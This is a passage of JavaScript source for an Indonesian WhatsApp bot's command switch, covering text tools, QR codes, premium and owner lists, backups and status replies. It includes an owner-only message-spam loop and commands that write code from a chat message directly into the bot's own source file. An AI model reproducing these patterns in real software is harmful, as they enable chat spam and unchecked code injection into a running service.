case "binary": {
  if (!text || !args[0]) return m.reply(`❌ Format: ${prefix}binary <encode/decode> <teks>`);
  
  const action = args[0].toLowerCase();
  const content = args.slice(1).join(' ');
  
  if (!content) return m.reply(`❌ Format: ${prefix}binary ${action} <teks>`);
  
  if (action === 'encode') {
    const encoded = content.split('').map(char => {
      return char.charCodeAt(0).toString(2).padStart(8, '0');
    }).join(' ');
    m.reply(`*🔢 BINARY ENCODE*\n\nInput: ${content}\n\nOutput:\n\`${encoded}\``);
  } else if (action === 'decode') {
    try {
      const binaryArray = content.split(' ').filter(b => b !== '');
      const decoded = binaryArray.map(bin => {
        return String.fromCharCode(parseInt(bin, 2));
      }).join('');
      m.reply(`*🔢 BINARY DECODE*\n\nInput: ${content}\n\nOutput:\n\`${decoded}\``);
    } catch (e) {
      m.reply('❌ String binary tidak valid!');
    }
  } else {
    m.reply(`❌ Pilihan: encode/decode\nContoh: ${prefix}binary encode Hello`);
  }
}
break

//==================================//

case "hex": {
  if (!text || !args[0]) return m.reply(`❌ Format: ${prefix}hex <encode/decode> <teks>`);
  
  const action = args[0].toLowerCase();
  const content = args.slice(1).join(' ');
  
  if (!content) return m.reply(`❌ Format: ${prefix}hex ${action} <teks>`);
  
  if (action === 'encode') {
    const encoded = Buffer.from(content).toString('hex');
    m.reply(`*🔠 HEX ENCODE*\n\nInput: ${content}\n\nOutput:\n\`${encoded}\``);
  } else if (action === 'decode') {
    try {
      const decoded = Buffer.from(content, 'hex').toString('utf-8');
      m.reply(`*🔠 HEX DECODE*\n\nInput: ${content}\n\nOutput:\n\`${decoded}\``);
    } catch (e) {
      m.reply('❌ String hex tidak valid!');
    }
  } else {
    m.reply(`❌ Pilihan: encode/decode\nContoh: ${prefix}hex encode Hello`);
  }
}
break

//==================================//

case "style": {
  if (!text) return m.reply(`❌ Format: ${prefix}style <teks>\nContoh: ${prefix}style Hello World`);
  
  const styles = {
    bold: `*${text}*`,
    italic: `_${text}_`,
    monospace: `\`${text}\``,
    strike: `~${text}~`,
    small: `乂${text}乂`,
    flipped: text.split('').reverse().join(''),
    upsideDown: text.split('').map(c => {
      const map = {
        'a': 'ɐ', 'b': 'q', 'c': 'ɔ', 'd': 'p', 'e': 'ǝ', 'f': 'ɟ', 'g': 'ƃ',
        'h': 'ɥ', 'i': 'ı', 'j': 'ɾ', 'k': 'ʞ', 'l': 'l', 'm': 'ɯ', 'n': 'u',
        'o': 'o', 'p': 'd', 'q': 'b', 'r': 'ɹ', 's': 's', 't': 'ʇ', 'u': 'n',
        'v': 'ʌ', 'w': 'ʍ', 'x': 'x', 'y': 'ʎ', 'z': 'z',
        'A': '∀', 'B': '𐐒', 'C': 'Ɔ', 'D': 'ᗡ', 'E': 'Ǝ', 'F': 'Ⅎ', 'G': 'פ',
        'H': 'H', 'I': 'I', 'J': 'ſ', 'K': '⋊', 'L': '˥', 'M': 'W', 'N': 'N',
        'O': 'O', 'P': 'Ԁ', 'Q': 'Ό', 'R': 'ᴚ', 'S': 'S', 'T': '⊥', 'U': '∩',
        'V': 'Λ', 'W': 'M', 'X': 'X', 'Y': '⅄', 'Z': 'Z',
        '0': '0', '1': 'Ɩ', '2': 'ᄅ', '3': 'Ɛ', '4': 'ㄣ', '5': 'ϛ', '6': '9',
        '7': 'ㄥ', '8': '8', '9': '6'
      };
      return map[c] || c;
    }).join('')
  };
  
  const result = `*🎨 TEXT STYLING*\n\n` +
                `Original: ${text}\n\n` +
                `Bold: ${styles.bold}\n` +
                `Italic: ${styles.italic}\n` +
                `Monospace: ${styles.monospace}\n` +
                `Strikethrough: ${styles.strike}\n` +
                `Small Caps: ${styles.small}\n` +
                `Flipped: ${styles.flipped}\n` +
                `Upside Down: ${styles.upsideDown}`;
  
  m.reply(result);
}
break

//==================================//

case "fontlist": {
  const fonts = [
    "𝘈𝘳𝘪𝘢𝘭 𝘐𝘵𝘢𝘭𝘪𝘤",
    "𝗔𝗿𝗶𝗮𝗹 𝗕𝗼𝗹𝗱",
    "𝘼𝙧𝙞𝙖𝙡 𝘽𝙤𝙡𝙙 𝙄𝙩𝙖𝙡𝙞𝙘",
    "𝒜𝓇𝒾𝒶𝓁 𝒮𝒸𝓇𝒾𝓅𝓉",
    "𝔄𝔯𝔦𝔞𝔩 𝔉𝔯𝔞𝔨𝔱𝔲𝔯",
    "𝔸𝕣𝕚𝕒𝕝 𝔹𝕝𝕒𝕔𝕜𝕓𝕠𝕒𝕣𝕕",
    "Ａｒｉａｌ Ｗｉｄｅ",
    "🅰🆁🅸🅰🅻 🅵🅰🅽🅲🆈",
    "αяιαℓ gяєєк",
    "卂尺丨卂ㄥ 匚丨尺匚ㄥ乇丂",
    "ᴀʀɪᴀʟ ꜱᴍᴀʟʟ ᴄᴀᴘꜱ",
    "Ⓐⓡⓘⓐⓛ Ⓑⓤⓑⓑⓛⓔⓢ",
    "🇦 🇷 🇮 🇦 🇱 🇸 🇹 🇦 🇷 🇸",
    "A҉r҉i҉a҉l҉ G҉l҉i҉t҉c҉h҉",
    "A⃣ R⃣ I⃣ A⃣ L⃣ E⃣ M⃣ O⃣ J⃣ I⃣"
  ];
  
  let fontList = "*🔤 FONT LIST*\n\n";
  fonts.forEach((font, index) => {
    fontList += `${index + 1}. ${font}\n`;
  });
  
  fontList += `\n*Cara pakai:*\nSalin font yang diinginkan, lalu tempel di chat!`;
  
  m.reply(fontList);
}
break

//==================================//

case "flip": {
  if (!text) return m.reply(`❌ Format: ${prefix}flip <teks>\nContoh: ${prefix}flip Hello`);
  
  const flipped = text.split('').reverse().join('');
  m.reply(`*🔄 FLIPPED TEXT*\n\nOriginal: ${text}\n\nFlipped: ${flipped}`);
}
break

//==================================//

case "spam": {
  if (!isCreator) return m.reply(global.mess.owner || "❌ Khusus owner!");
  
  if (!text || args.length < 2) {
    return m.reply(`❌ Format: ${prefix}spam <teks> <jumlah>\nContoh: ${prefix}spam test 5`);
  }
  
  const spamText = args.slice(0, -1).join(' ');
  const count = parseInt(args[args.length - 1]);
  
  if (isNaN(count) || count < 1 || count > 20) {
    return m.reply('❌ Jumlah spam harus antara 1-20!');
  }
  
  m.reply(`🚀 Memulai spam ${count}x...`);
  
  for (let i = 1; i <= count; i++) {
    setTimeout(() => {
      sock.sendMessage(m.chat, { text: `${spamText} [${i}/${count}]` }, { quoted: m });
    }, i * 500);
  }
}
break

//==================================//

case "cekresi": {
  m.reply(`*📦 CEK RESI*\n\nFormat: ${prefix}cekresi <kode_resi> <kurir>\n\nContoh: ${prefix}cekresi 1234567890 jne\n\nKurir yang tersedia:\n• jne\n• pos\n• tiki\n• jnt\n• sicepat\n• ninja\n• anteraja\n\n_*Fitur ini hanya format, butuh implementasi lebih lanjut*_`);
}
break

//==================================//

case "qrcode": {
  if (!text) return m.reply(`❌ Format: ${prefix}qrcode <teks/url>\nContoh: ${prefix}qrcode https://google.com`);
  
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(text)}`;
  
  try {
    await sock.sendMessage(m.chat, {
      image: { url: qrUrl },
      caption: `*📱 QR CODE*\n\nData: ${text}\n\nScan QR code di atas!`
    }, { quoted: m });
  } catch (e) {
    m.reply(`❌ Gagal membuat QR code!\n\nAlternatif: ${qrUrl}`);
  }
}
break

//==================================//

case "shorturl": {
  if (!text) return m.reply(`❌ Format: ${prefix}shorturl <url>\nContoh: ${prefix}shorturl https://verylongurl.com`);
  
  // Simple URL validation
  const urlPattern = /^(https?:\/\/)?([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?$/;
  if (!urlPattern.test(text)) {
    return m.reply('❌ URL tidak valid! Pastikan format URL benar.');
  }
  
  // For demonstration - in real implementation you'd use a URL shortener API
  const fakeShortUrl = `https://short.url/${Math.random().toString(36).substr(2, 6)}`;
  
  m.reply(`*🔗 URL SHORTENER*\n\nOriginal: ${text}\n\nShortened: ${fakeShortUrl}\n\n_*Ini hanya contoh, gunakan layanan seperti bit.ly atau tinyurl untuk URL asli*_`);
}
break

//==================================//

case "stickerinfo": {
  if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.includes('sticker')) {
    return m.reply('❌ Balas sticker untuk melihat info!');
  }
  
  const sticker = m.quoted;
  let info = `*🖼️ STICKER INFO*\n\n`;
  
  if (sticker.fileSize) info += `• Size: ${bytesToSize(sticker.fileSize)}\n`;
  if (sticker.width && sticker.height) info += `• Dimensions: ${sticker.width}x${sticker.height}\n`;
  if (sticker.mimetype) info += `• Type: ${sticker.mimetype}\n`;
  
  // Check if animated
  if (sticker.isAnimated) info += `• Animated: Yes\n`;
  
  // Check if has author/pack
  if (sticker.author || sticker.packName) {
    info += `\n*Creator Info:*\n`;
    if (sticker.author) info += `• Author: ${sticker.author}\n`;
    if (sticker.packName) info += `• Pack: ${sticker.packName}\n`;
  }
  
  m.reply(info);
}
break

//==================================//

case "getexif": {
  if (!m.quoted || !isMedia) {
    return m.reply('❌ Balas media (foto/video/sticker) untuk melihat exif!');
  }
  
  const media = m.quoted;
  let exifInfo = `*📊 MEDIA INFO*\n\n`;
  
  // Basic info
  exifInfo += `• Type: ${media.mimetype || 'Unknown'}\n`;
  if (media.fileSize) exifInfo += `• Size: ${bytesToSize(media.fileSize)}\n`;
  if (media.duration) exifInfo += `• Duration: ${media.duration}s\n`;
  
  // For images/videos
  if (media.width && media.height) {
    exifInfo += `• Resolution: ${media.width}x${media.height}\n`;
    exifInfo += `• Aspect Ratio: ${(media.width/media.height).toFixed(2)}:1\n`;
  }
  
  // For WhatsApp-specific
  if (media.directPath) exifInfo += `• Has Direct Path: Yes\n`;
  if (media.mediaKey) exifInfo += `• Has Media Key: Yes\n`;
  
  // Timestamp if available
  exifInfo += `• Timestamp: ${new Date().toLocaleString('id-ID')}\n`;
  
  m.reply(exifInfo);
}
break

//==================================//

case "self": {
    if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!")
    sock.public = false
    global.db.settings = global.db.settings || {}
    global.db.settings.isPublic = false; 
    m.reply("✅ Berhasil mengganti ke mode *self*")
}
break 

//==================================//          
        
case "public": {
    if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!")
    sock.public = true
    global.db.settings = global.db.settings || {}
    global.db.settings.isPublic = true; 
    m.reply("✅ Berhasil mengganti ke mode *public*")
}
break

//==================================//  		
        
case "getcase": {
if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!")
if (!text) return m.reply("Format: .getcase nama_case")
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./elaina.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`❌ Case *${text}* tidak ditemukan`)
}
}
break          
        
//==================================//

case 'addcase': {
    if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!");
    if (!text) return m.reply(`Contoh: .addcase nama_case`);
    const namaFile = path.join(__dirname, 'elaina.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "❌ Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`❌ Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return m.reply(`❌ Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('✅ Sukses menambahkan case baru:', caseBaru);
                    return m.reply('✅ Sukses menambahkan case!\n\nSilakan edit kode case di file elaina.js');
                }
            });
        } else {
            console.error(result.message);
            return m.reply(result.message);
        }
    });
}
break

//==================================//

case 'addcaser': {
    if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!");
    
    if (!text && !m.quoted) {
        return m.reply(`❌ Format salah!\n\nGunakan:\n${prefix}addcaser <nama_case>\n\nKemudian reply pesan yang berisi kode case yang ingin ditambahkan.`);
    }
    
    const caseName = text.trim();
    if (!caseName) return m.reply(`❌ Harap berikan nama case!\n\nContoh: ${prefix}addcaser sayhello`);
    
    // Cek apakah ada quoted message
    let codeToAdd = "";
    
    if (m.quoted && m.quoted.text) {
        codeToAdd = m.quoted.text;
    } else {
        return m.reply(`❌ Tidak ada kode yang direply!\n\nBalas pesan yang berisi kode case dengan perintah:\n${prefix}addcaser ${caseName}`);
    }
    
    if (!codeToAdd || codeToAdd.trim() === "") {
        return m.reply("❌ Kode yang direply kosong!");
    }
    
    const namaFile = path.join(__dirname, 'elaina.js');
    
    try {
        let data = await fs.promises.readFile(namaFile, 'utf8');
        
        // Cek apakah case sudah ada
        const casePattern = new RegExp(`case\\s+['"\`]${caseName}['"\`]:`);
        if (casePattern.test(data)) {
            return m.reply(`❌ Case "${caseName}" sudah ada!`);
        }
        
        // Format kode case yang akan ditambahkan
        const formattedCode = `\ncase "${caseName}":\n${codeToAdd}\nbreak;\n\n`;
        
        // Temukan posisi default case
        const defaultIndex = data.lastIndexOf("default:");
        if (defaultIndex === -1) {
            return m.reply("❌ Tidak dapat menemukan 'default:' dalam file elaina.js");
        }
        
        // Sisipkan case baru sebelum default
        const newData = data.slice(0, defaultIndex) + formattedCode + data.slice(defaultIndex);
        
        // Tulis kembali file
        await fs.promises.writeFile(namaFile, newData, 'utf8');
        
        console.log(`✅ Case "${caseName}" berhasil ditambahkan`);
        
        // Kirim konfirmasi
        await m.reply(`✅ Case *${caseName}* berhasil ditambahkan!\n\nKode yang ditambahkan:\n\`\`\`javascript\ncase "${caseName}":\n${codeToAdd}\nbreak;\n\`\`\``);
        
        // Beri opsi untuk mengetes langsung
        setTimeout(() => {
            sock.sendMessage(m.chat, {
                text: `🎯 *Tips:* Anda bisa langsung mengetes case baru dengan:\n\`${prefix}${caseName}\``
            }, { quoted: m });
        }, 1000);
        
    } catch (err) {
        console.error('❌ Error:', err);
        return m.reply(`❌ Terjadi kesalahan:\n\`\`\`${err.message}\`\`\``);
    }
}
break

//==================================//

case 'delcase': {
    if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!");
    if (!text) 
        return m.reply(`❌ Contoh: ${prefix}delcase nama_case`);

    async function removeCase(filePath, caseNameToRemove) {
        try {
            let data = await fs.promises.readFile(filePath, 'utf8');
            
            const regex = new RegExp(`case\\s+['"\`]${caseNameToRemove}['"\`]:[\\s\\S]*?break;?\\n`, 'g');
            
            const modifiedData = data.replace(regex, '');

            if (data === modifiedData) {
                return m.reply(`❌ Case "${caseNameToRemove}" tidak ditemukan.\n\nGunakan ${prefix}getcase <nama> untuk melihat daftar case yang ada.`);
            }

            await fs.promises.writeFile(filePath, modifiedData, 'utf8');
            m.reply(`✅ Sukses menghapus case: *${caseNameToRemove}*`);
        } catch (err) {
            m.reply(`❌ Terjadi kesalahan saat memproses file: ${err.message}`);
        }
    }
    removeCase('./elaina.js', text.trim());
}
break
        
//==================================//

case "addowner": case "addown": {
if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!")
if (!m.quoted && !text) return m.reply(`❌ Contoh: ${prefix+command} 6285###`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (global.owner.includes(input2) || owners.includes(input) || input === botNumber) return m.reply(`❌ Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`✅ Berhasil menambah owner @${input2}`)
}
break        
        
//==================================//
        
case "delowner": case "delown": {
if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!")
if (!m.quoted && !text) return m.reply(`❌ Contoh: ${prefix+command} 6285###`)
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (global.owner.includes(input2) || input == botNumber) return m.reply(`❌ Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`❌ Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`✅ Berhasil menghapus owner @${input2}`)
}
break

//==================================//

case 'addprem': {
  if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!")
  if (!args[0]) return m.reply(`❌ Format: ${prefix + command} 628xxx 7`)
  let users = []
  if (m.isGroup) {
    if (m.mentionedJid.length) {
      users = m.mentionedJid.map(id => {
        if (id.endsWith('@lid')) {
          let p = m.metadata.participants.find(x => x.lid === id || x.id === id)
          return p ? p.jid : null
        } else {
          return id
        }
      }).filter(Boolean)
    } else {
      users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
    }
  } else {
    users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
  }

  let days = Number(args[1])
  if (!days || days <= 0) days = 1
  const ms = days * 24 * 60 * 60 * 1000
  const expired = Date.now() + ms

  for (let jid of users) {
    const user = prem.find(u => u.jid === jid)
    if (user) {
      user.expired = expired
    } else {
      prem.push({ jid, expired })
    }
  }

  fs.writeFileSync(dbPrem, JSON.stringify(prem, null, 2))
  m.reply(
  `✅ Premium ${users.map(j => '@' + j.split('@')[0]).join(', ')} ditambahkan selama *${days} hari*\n⏰ Expired: ${new Date(expired).toLocaleString('id-ID')}`,
  users
)
}
break
        
//==================================//

case 'delprem': {
  if (!isCreator) return m.reply(global.mess.owner || "Khusus owner!")
  if (!args[0] && !m.mentionedJid.length)
  return m.reply(`❌ Format: ${prefix + command} 628xxx`)
  let users = []
  if (m.isGroup) {
    if (m.mentionedJid.length) {
      users = m.mentionedJid.map(id => {
        if (id.endsWith('@lid')) {
          let p = m.metadata.participants.find(x => x.lid === id || x.id === id)
          return p ? p.jid : null
        } else {
          return id
        }
      }).filter(Boolean)
    } else {
      users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
    }
  } else {
    users = [args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net']
  }

  let removed = []
  for (let jid of users) {
    const idx = prem.findIndex(u => u.jid === jid)
    if (idx !== -1) {
      prem.splice(idx, 1)
      removed.push(jid)
    }
  }

  fs.writeFileSync(dbPrem, JSON.stringify(prem, null, 2))

  if (removed.length === 0) {
    return m.reply(
      `❌ Nomor ${users.map(j => '@' + j.split('@')[0]).join(', ')} bukan premium.`,
      users
    )
  }

  m.reply(
    `✅ Premium ${removed.map(j => '@' + j.split('@')[0]).join(', ')} berhasil dihapus.`,
    removed
  )
}
break

//==================================//

case "listprem": {
  const path = "./data/premium.json";

  if (!fs.existsSync(path)) return m.reply("❌ Belum ada data premium.");
  const data = JSON.parse(fs.readFileSync(path));

  if (!Array.isArray(data) || data.length === 0) return m.reply("❌ Belum ada user premium.");

  let textList = "*「 📋 LIST USER PREMIUM 」*\n\n";
  const now = Date.now();
  let no = 1;

  for (const user of data) {
    const jid = user.jid?.replace(/[^0-9]/g, "") || "-";
    const expired = user.expired || 0;
    const status = expired > now ? "🟢 AKTIF" : "🔴 EXPIRED";
    const expiredDate = new Date(expired).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const daysLeft = Math.max(0, Math.ceil((expired - now) / (1000 * 60 * 60 * 24)));

    textList += `${no++}. wa.me/${jid}\n   Status: ${status}\n   Sisa: ${daysLeft} hari\n   Exp: ${expiredDate}\n\n`;
  }

  m.reply(textList.trim());
}
break 

//==================================//

case "backup": {
    if (!isCreator) return m.reply(global.mess?.owner || "❌ Khusus owner!");
    
    try {
        await m.reply("⏳ *Membuat backup ZIP...*");
        
        const fs = require('fs');
        const path = require('path');
        const JSZip = require('jszip');
        
        // Buat instance zip
        const zip = new JSZip();
        
        // List file dan folder yang mau di-backup
        const backupItems = [
            { path: 'index.js', type: 'file' },
            { path: 'settings.js', type: 'file' },
            { path: 'elaina.js', type: 'file' },
            { path: 'package.json', type: 'file' },
            { path: 'README.md', type: 'file' },
            { path: 'lib', type: 'folder' },
            { path: 'data', type: 'folder' }
        ];
        
        let totalFiles = 0;
        let skippedFiles = 0;
        
        // Fungsi untuk tambah file ke zip
        const addFileToZip = (filePath, zipPath = '') => {
            try {
                if (fs.existsSync(filePath)) {
                    const stats = fs.statSync(filePath);
                    
                    if (stats.isDirectory()) {
                        // Jika folder, proses semua file di dalamnya
                        const files = fs.readdirSync(filePath);
                        files.forEach(file => {
                            const fullPath = path.join(filePath, file);
                            const newZipPath = path.join(zipPath, file);
                            addFileToZip(fullPath, newZipPath);
                        });
                    } else {
                        // Jika file, tambahkan ke zip
                        const content = fs.readFileSync(filePath);
                        zip.file(zipPath || filePath, content);
                        totalFiles++;
                        console.log(`✅ Added: ${filePath}`);
                    }
                }
            } catch (error) {
                console.log(`⚠️  Skipped ${filePath}:`, error.message);
                skippedFiles++;
            }
        };
        
        // Tambahkan semua item ke zip
        backupItems.forEach(item => {
            addFileToZip(item.path);
        });
        
        // Generate zip file
        const zipData = await zip.generateAsync({
            type: 'nodebuffer',
            compression: 'DEFLATE',
            compressionOptions: {
                level: 9
            }
        });
        
        if (zipData.length === 0) {
            return m.reply("❌ Backup kosong! Tidak ada file yang ditambahkan.");
        }
        
        // Simpan sementara ke tmp
        const tmpDir = './tmp';
        if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
        }
        
        const timestamp = Date.now();
        const zipFileName = `bot-backup-${timestamp}.zip`;
        const zipFilePath = path.join(tmpDir, zipFileName);
        
        fs.writeFileSync(zipFilePath, zipData);
        
        // Hitung ukuran
        const fileSizeMB = (zipData.length / (1024 * 1024)).toFixed(2);
        
        // Kirim sebagai document ZIP
        await sock.sendMessage(m.sender, {
            document: fs.readFileSync(zipFilePath),
            fileName: zipFileName,
            mimetype: "application/zip",
            caption: `📦 *BACKUP ZIP BERHASIL!*\n\n` +
                    `📁 File: ${zipFileName}\n` +
                    `📊 Ukuran: ${fileSizeMB} MB\n` +
                    `📄 Total: ${totalFiles} file\n` +
                    `⚠️  Skipped: ${skippedFiles} file\n` +
                    `🗓️ Tanggal: ${new Date().toLocaleString('id-ID')}\n` +
                    `🤖 Bot: ${global.namaBot || 'WhatsApp Bot'}`
        }, { quoted: m });
        
        // Hapus file temporary
        setTimeout(() => {
            try {
                fs.unlinkSync(zipFilePath);
                console.log(`🧹 Cleanup: ${zipFileName} deleted`);
            } catch (e) {
                console.log("⚠️  Cleanup error:", e.message);
            }
        }, 10000);
        
        if (m.chat !== m.sender) {
            await m.reply(`✅ Backup ZIP berhasil dikirim! (${fileSizeMB} MB, ${totalFiles} files)`);
        }
        
    } catch (err) {
        console.error("❌ JSZip Backup Error:", err);
        
        // Jika jszip tidak ada, install dulu
        if (err.message.includes("Cannot find module 'jszip'")) {
            await m.reply("📦 *Menginstall JSZip...*\n\nTunggu sebentar...");
            
            try {
                const { execSync } = require('child_process');
                execSync('npm install jszip --legacy-peer-deps --no-bin-links', { 
                    cwd: process.cwd(),
                    stdio: 'inherit' 
                });
                
                return m.reply("✅ JSZip installed! Coba `.backup` lagi.");
            } catch (installErr) {
                return m.reply(`❌ Gagal install JSZip:\n${installErr.message}`);
            }
        }
        
        await m.reply(`❌ Backup gagal:\n\`\`\`${err.message}\`\`\``);
    }
}
break;

//==================================//

case "ping": {
  try {
    const hrStart = process.hrtime.bigint(); 
    const hrEnd = process.hrtime.bigint();
    const latencyMs = Number(hrEnd - hrStart) / 1e6;
    const uptimeStr = typeof runtime === 'function' ? runtime(process.uptime()) : `${Math.floor(process.uptime())}s`;
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const mem = process.memoryUsage();
    const memUsedMB = (mem.rss / 1024 / 1024).toFixed(2);
    const heapUsedMB = (mem.heapUsed / 1024 / 1024).toFixed(2);
    const heapTotalMB = (mem.heapTotal / 1024 / 1024).toFixed(2);
    const cpuModel = os.cpus && os.cpus()[0] ? os.cpus()[0].model : 'N/A';
    const cpuCount = os.cpus ? os.cpus().length : 'N/A';
    const platform = `${process.platform} ${process.arch}`;
    const nodev = process.version;

    const teks = `*📡 SERVER INFORMATION*\n` +
                 `• Runtime : ${uptimeStr}\n` +
                 `• Latency : ${latencyMs.toFixed(2)} ms\n` +
                 `• Time    : ${now}\n\n` +
                 `*🧠 MEMORY USAGE*\n` +
                 `• RSS      : ${memUsedMB} MB\n` +
                 `• Heap     : ${heapUsedMB} / ${heapTotalMB} MB\n\n` +
                 `*⚙️ SYSTEM*\n` +
                 `• CPU      : ${cpuModel} (${cpuCount} cores)\n` +
                 `• Platform : ${platform}\n` +
                 `• Node     : ${nodev}`;
    await m.reply(teks);
  } catch (err) {
    console.error(err);
    m.reply(`❌ Error saat mengecek ping:\n${err.message || String(err)}`);
  }
}
break;

//==================================//

// FITUR SIMPLE: STATUS BOT
case "status": {
    const uptime = runtime(process.uptime());
    const memory = process.memoryUsage();
    const usedMB = (memory.rss / 1024 / 1024).toFixed(2);
    const totalUsers = prem.length;
    const activeUsers = prem.filter(u => Date.now() < u.expired).length;
    
    const statusText = `*🤖 BOT STATUS*\n\n` +
                      `• Uptime: ${uptime}\n` +
                      `• Memory: ${usedMB} MB\n` +
                      `• Mode: ${sock.public ? "Public" : "Self"}\n` +
                      `• Premium Users: ${activeUsers}/${totalUsers}\n` +
                      `• Owner Count: ${owners.length}\n` +
                      `• Time: ${moment().tz("Asia/Jakarta").format("HH:mm:ss")}`;
    
    m.reply(statusText);
}
break;

//==================================//

// FITUR SIMPLE: HELP
case "help": {
    const helpText = `*📚 BOT HELP*\n\n` +
                    `*Owner Commands:*\n` +
                    `• .owner-menu - Menu owner\n` +
                    `• .addcaser - Tambah case dengan reply\n` +
                    `• .backup - Backup bot\n` +
                    `• .ping - Cek status server\n\n` +
                    `*Fun Commands:*\n` +
                    `• .fun-menu - Menu fun games\n` +
                    `• .quote - Quotes inspiratif\n` +
                    `• .tebak - Game tebak-tebakan\n` +
                    `• .jodoh - Ramalan jodoh\n\n` +
                    `*Tools Commands:*\n` +
                    `• .tools-menu - Menu tools\n` +
                    `• .calc - Kalkulator\n` +
                    `• .style - Text styling\n` +
                    `• .qrcode - Buat QR code\n\n` +
                    `Prefix: ${prefix}`;
    
    m.reply(helpText);
}
break;

//==================================//

// FITUR SIMPLE: SAY
case "say": {
  if (!text) return m.reply(`❌ Format: ${prefix}say <pesan>\nContoh: ${prefix}say Hello World`);
  
  m.reply(`📢 *SAY COMMAND*\n\n${text}`);
}
break;

//==================================//

// FITUR SIMPLE: ECHO
case "echo": {
  if (!text) return m.reply(`❌ Format: ${prefix}echo <teks>\nContoh: ${prefix}echo Testing`);
  
  m.reply(text);
}
break;

//==================================//

// FITUR SIMPLE: TIME
case "time": {
  const now = moment().tz("Asia/Jakarta");
  const timeText = `*🕒 WAKTU SEKARANG*\n\n` +
                  `• Jam: ${now.format("HH:mm:ss")}\n` +
                  `• Tanggal: ${now.format("DD MMMM YYYY")}\n` +
                  `• Hari: ${now.format("dddd")}\n` +
                  `• Zona Waktu: Asia/Jakarta (GMT+7)\n\n` +
                  `_${ucapanWaktu}${pushname}_`;
  
  m.reply(timeText);
}
break;

//==================================//

// FITUR SIMPLE: DATE
case "date": {
  const now = new Date();
  const options = { 
    weekday: 'long', 
    year: 'numeric', 
    month: 'long', 
    day: 'numeric',
    timeZone: 'Asia/Jakarta'
  };
  
  const dateString = now.toLocaleDateString('id-ID', options);
  const timeString = now.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
  
  m.reply(`*📅 TANGGAL & WAKTU*\n\n${dateString}\n${timeString}`);
}
break;

//==================================//

// FITUR SIMPLE: RANDOM NUMBER
case "random": case "rand": {
  const min = parseInt(args[0]) || 1;
  const max = parseInt(args[1]) || 100;
  
  if (min >= max) {
    return m.reply(`❌ Format: ${prefix}random <min> <max>\nContoh: ${prefix}random 1 100`);
  }
  
  const randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
  
  m.reply(`*🎲 RANDOM NUMBER*\n\nRange: ${min} - ${max}\n\nHasil: *${randomNum}*`);
}
break;

//==================================//

// FITUR SIMPLE: CHOOSE
case "choose": case "pilih": {
  if (!text) return m.reply(`❌ Format: ${prefix}choose <opsi1> | <opsi2> | ...\nContoh: ${prefix}choose makan | minum | tidur`);
  
  const choices = text.split(/[|,]/).map(c => c.trim()).filter(c => c);
  
  if (choices.length < 2) {
    return m.reply(`❌ Minimal 2 pilihan!\nContoh: ${prefix}choose pizza | burger | pasta`);
  }
  
  const randomChoice = choices[Math.floor(Math.random() * choices.length)];
  
  m.reply(`*🤔 PILIHAN*\n\nPilihan: ${choices.join(", ")}\n\nSaya pilih: *${randomChoice}*`);
}
break;

//==================================//

// FITUR SIMPLE: 8BALL
case "8ball": case "ball": {
  if (!text) return m.reply(`❌ Format: ${prefix}8ball <pertanyaan>\nContoh: ${prefix}8ball Apakah aku ganteng?`);
  
  const answers = [
    "Ya, pasti!", "Tidak mungkin!", "Mungkin saja", 
    "Coba tanya lagi", "Sudah ditakdirkan", "Tidak akan pernah",
    "Peluangnya besar", "Peluangnya kecil", "Bisa jadi",
    "Tunggu dan lihat", "Tanda-tanda menunjukkan iya", 
    "Lebih baik tidak sekarang", "Fokus dan coba lagi",
    "Jawabannya tidak jelas", "Ya", "Tidak"
  ];
  
  const randomAnswer = answers[Math.floor(Math.random() * answers.length)];
  
